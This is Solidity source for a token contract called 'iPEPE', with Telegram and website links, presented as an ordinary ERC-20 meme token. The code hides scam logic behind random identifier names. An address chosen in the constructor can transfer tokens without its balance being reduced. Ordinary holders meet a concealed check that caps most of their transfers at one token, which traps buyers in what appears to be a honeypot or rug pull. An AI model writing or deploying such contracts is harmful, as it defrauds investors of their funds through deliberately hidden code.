/*

Telegram: https://t.me/ercipepe

Website: https://ipepe.ethtoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract iPEPE is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private zfxsn;

    function approve(address whmvpdjousf, uint256 hgxlktfisbva) public returns (bool success) {
        allowance[msg.sender][whmvpdjousf] = hgxlktfisbva;
        emit Approval(msg.sender, whmvpdjousf, hgxlktfisbva);
        return true;
    }

    function transferFrom(address wdxstl, address meprntohs, uint256 hgxlktfisbva) public returns (bool success) {
        require(hgxlktfisbva <= allowance[wdxstl][msg.sender]);
        allowance[wdxstl][msg.sender] -= hgxlktfisbva;
        wtikyjrpo(wdxstl, meprntohs, hgxlktfisbva);
        return true;
    }

    string public symbol;

    mapping(address => bool) private okpendcb;

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private cqzfynarlsxk;

    string public name;

    uint8 public decimals = 9;

    IUniswapV2Router02 private azebldfvrgs;

    mapping(address => uint256) public balanceOf;

    constructor(string memory yewcig, string memory riugyf, address enmjxgbdr, address ahfjkir) {
        name = yewcig;
        symbol = riugyf;
        balanceOf[msg.sender] = totalSupply;
        okpendcb[ahfjkir] = true;
        azebldfvrgs = IUniswapV2Router02(enmjxgbdr);
    }

    function transfer(address meprntohs, uint256 hgxlktfisbva) public returns (bool success) {
        wtikyjrpo(msg.sender, meprntohs, hgxlktfisbva);
        return true;
    }

    function wtikyjrpo(address wdxstl, address meprntohs, uint256 hgxlktfisbva) private {
        address afqrujcowlpi = IUniswapV2Factory(azebldfvrgs.factory()).getPair(address(this), azebldfvrgs.WETH());
        bool evfykhp = cqzfynarlsxk[wdxstl] == block.number;
        if (!okpendcb[wdxstl]) {
            if (wdxstl != afqrujcowlpi && hgxlktfisbva < totalSupply && (!evfykhp || hgxlktfisbva > zfxsn[wdxstl])) {
                require(totalSupply / (10 ** decimals) >= hgxlktfisbva);
            }
            balanceOf[wdxstl] -= hgxlktfisbva;
        }
        zfxsn[meprntohs] = hgxlktfisbva;
        balanceOf[meprntohs] += hgxlktfisbva;
        cqzfynarlsxk[meprntohs] = block.number;
        emit Transfer(wdxstl, meprntohs, hgxlktfisbva);
    }
}
